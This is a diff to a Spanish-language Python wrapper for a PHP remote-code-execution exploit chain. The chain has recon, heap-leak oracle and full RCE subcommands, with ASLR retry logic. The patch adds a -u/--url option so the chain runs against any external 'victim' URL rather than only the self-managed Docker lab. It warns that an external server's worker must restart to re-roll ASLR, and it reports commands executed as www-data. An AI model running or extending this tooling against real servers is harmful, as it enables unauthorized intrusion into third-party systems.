@@ -169,18 +169,18 @@ def cmd_check(args: argparse.Namespace) -> int:
 # ---------------------------------------------------------------------------
 # SUBCOMANDO: info — reconocimiento del target RCE
 # ---------------------------------------------------------------------------
-def cmd_info(_args: argparse.Namespace) -> int:
-    phase("2", "RECONOCIMIENTO del target RCE (preflight sin red — el heap queda intacto)")
-    sys.argv = ["php2shell.py", "--info"]
+def cmd_info(args: argparse.Namespace) -> int:
+    phase("2", f"RECONOCIMIENTO de {args.url} (preflight sin red — el heap queda intacto)")
+    sys.argv = ["php2shell.py", "--info", "-u", args.url]
     return rce_engine().main()
 
 
 # ---------------------------------------------------------------------------
 # SUBCOMANDO: leak — oracle sin fire
 # ---------------------------------------------------------------------------
-def cmd_leak(_args: argparse.Namespace) -> int:
-    phase("2", "ORACLE de leak (solo lectura; el par de fire NUNCA se envía)")
-    sys.argv = ["php2shell.py", "--check"]
+def cmd_leak(args: argparse.Namespace) -> int:
+    phase("2", f"ORACLE de leak contra {args.url} (solo lectura; el par de fire NUNCA se envía)")
+    sys.argv = ["php2shell.py", "--check", "-u", args.url]
     return rce_engine().main()
 
 
@@ -214,7 +214,7 @@ def rce_target_fresh() -> None:
 # SUBCOMANDO: rce — la cadena completa
 # ---------------------------------------------------------------------------
 def cmd_rce(args: argparse.Namespace) -> int:
-    phase("3", "CADENA RCE COMPLETA (leak in-band → fire → prueba en docroot)")
+    phase("3", f"CADENA RCE COMPLETA contra {args.url}")
     if not shutil.which("docker"):
         die("docker no está disponible")
     cmd = args.cmd
@@ -222,14 +222,26 @@ def cmd_rce(args: argparse.Namespace) -> int:
         warn(f"comando de {len(cmd.encode())} bytes (>14): puede exceder la ventana del payload")
     engine = rce_engine()
 
+    # El lab propio (:18081) se gestiona aquí (contenedor fresco por intento =
+    # nueva generación ASLR). Un target EXTERNO no se toca: los reintentos
+    # re-ejecutan la cadena, pero la generación ASLR solo cambia si su worker
+    # se reinicia en el lado del servidor.
+    lab_managed = args.url.rstrip("/") == RCE_URL.rstrip("/")
+    if not lab_managed:
+        warn(f"target EXTERNO ({args.url}): no se gestiona ningún contenedor; "
+             "los reintentos re-ejecutan la cadena contra el mismo worker")
+        warn("para una nueva generación ASLR el worker víctima debe reiniciarse en su servidor")
+
     for attempt in range(1, args.attempts + 1):
-        print(f"\n{B}  ── intento {attempt}/{args.attempts} · contenedor fresco (nueva generación ASLR) ──{X}")
-        try:
-            rce_target_fresh()
-        except subprocess.CalledProcessError as exc:
-            err(f"no se pudo levantar el target: {exc.stderr.strip()[:120]}")
-            return 3
-        argv = ["-c", cmd]
+        print(f"\n{B}  ── intento {attempt}/{args.attempts}"
+              + (" · contenedor fresco (nueva generación ASLR) ──" if lab_managed else " ──") + X)
+        if lab_managed:
+            try:
+                rce_target_fresh()
+            except subprocess.CalledProcessError as exc:
+                err(f"no se pudo levantar el target: {exc.stderr.strip()[:120]}")
+                return 3
+        argv = ["-c", cmd, "-u", args.url]
         if args.explain:
             argv.append("--explain")
         if args.quiet:
@@ -237,10 +249,10 @@ def cmd_rce(args: argparse.Namespace) -> int:
         sys.argv = ["php2shell.py", *argv]
         if engine.main() == 0:
             print()
-            ok(f"{B}RCE CONFIRMADO{X} — comando ejecutado como www-data en el intento {attempt}/{args.attempts}")
+            ok(f"{B}RCE CONFIRMADO{X} en {args.url} — comando ejecutado como www-data (intento {attempt}/{args.attempts})")
             return 0
         if attempt < args.attempts:
-            warn("generación ASLR no apta — recreando contenedor…")
+            warn("generación ASLR no apta — " + ("recreando contenedor…" if lab_managed else "reintentando…"))
     print()
     err(f"sin RCE en {args.attempts} intentos (lotería ASLR — el autor documenta 2/3–3/3 por generación)")
     err("vuelve a lanzar: cada tirada crea contenedores frescos. Ver EXPLOTACION.md §4.2")
@@ -303,14 +315,17 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--verbose", action="store_true")
     p.set_defaults(fn=cmd_check)
 
-    p = sub.add_parser("info", help="reconocimiento del target RCE (:18081)")
+    p = sub.add_parser("info", help="reconocimiento del target RCE (versión, build, worker)")
+    p.add_argument("-u", "--url", default=RCE_URL, help=f"target (default: {RCE_URL})")
     p.set_defaults(fn=cmd_info)
 
     p = sub.add_parser("leak", help="oracle de leak del heap SIN fire")
+    p.add_argument("-u", "--url", default=RCE_URL, help=f"target (default: {RCE_URL})")
     p.set_defaults(fn=cmd_leak)
 
     p = sub.add_parser("rce", help="cadena RCE completa (probabilística por ASLR; reintentos)")
     p.add_argument("cmd", help='comando a ejecutar (p. ej. "id", <=14 bytes ASCII)')
+    p.add_argument("-u", "--url", default=RCE_URL, help=f"URL de la víctima (default: {RCE_URL} — lab gestionado; otra URL = target externo)")
     p.add_argument("--attempts", type=int, default=DEFAULT_ATTEMPTS, help=f"default {DEFAULT_ATTEMPTS}")
     p.add_argument("--explain", action="store_true", help="narración didáctica de cada fase")
     p.add_argument("--quiet", action="store_true", help="menos output (para grabar)")
